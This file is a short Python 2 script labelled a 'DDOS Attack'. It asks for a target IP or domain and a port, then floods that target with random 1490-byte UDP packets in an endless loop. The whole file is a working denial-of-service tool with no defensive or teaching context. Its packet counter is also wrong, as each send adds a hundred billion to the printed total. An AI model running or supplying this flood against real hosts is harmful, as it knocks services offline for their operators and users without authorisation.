import os,sys,time 
import socket 
import random 
import time
print("Starting DDOS Attack")
print("") 
ip = raw_input("\033[38;5;21mEnter IP or Domain   :\033[1;92m ")
port = input("\033[1;95mEnter Port : \033[1;92m")
print ""
time.sleep(1.58)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
send = 0
while True:
     sock.sendto(bytes, (ip,port))
     send = send + 100000000000
     port = port + 0
     print "\033[1;92mSent\033[38;5;197m %s \033[38;5;48mpackets on \033[1;96m%s \033[1;94mport \033[1;95m%s"%(send,ip,port)
     if port == 65534:
        port = 0


